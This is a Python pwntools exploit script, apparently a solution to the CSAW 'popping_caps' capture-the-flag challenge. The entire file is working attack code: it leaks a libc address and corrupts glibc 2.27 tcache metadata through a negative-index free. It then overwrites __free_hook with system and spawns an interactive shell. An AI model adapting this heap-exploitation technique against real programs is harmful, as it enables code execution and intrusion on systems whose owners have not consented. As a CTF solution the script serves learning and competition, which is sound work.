from pwn import *

#target = remote("pwn.chal.csaw.io", 1008)
target = process('./popping_caps', env={"LD_PRELOAD": "./libc-2.27.so"})
#gdb.attach(target, gdbscript='pie b *0xbca')


elf = ELF("popping_caps")
libc = ELF("libc-2.27.so")

leak = target.recvuntil("Here is system ")
leak = target.recvline()
leak = leak.strip(b"\n")
leak = int(leak, 16)

libcBase = leak - libc.symbols["system"]
print("libc base: " + hex(libcBase))


def pl():
    print(target.recvuntil("Your choice:"))


def malloc(x):
    pl()
    target.sendline("1")
    print(target.recvuntil("How many:"))
    target.sendline(str(x))


def write(x):
    pl()
    target.sendline("3")
    print(target.recvuntil("Read me in:"))
    target.send(x)


def free(x):
    pl()
    target.sendline("2")
    print(target.recvuntil("Whats in a free:"))
    target.sendline(str(x))


malloc(0)

free(-592)

malloc(0x240)

payload = p64(0x1) + p64(0x0)*7 + p64(libcBase + libc.symbols["__free_hook"]) + b"/bin/sh\x00"

write(payload)

malloc(0)

write(p64(libcBase + libc.symbols["system"]))

free(-2333262)

target.interactive()
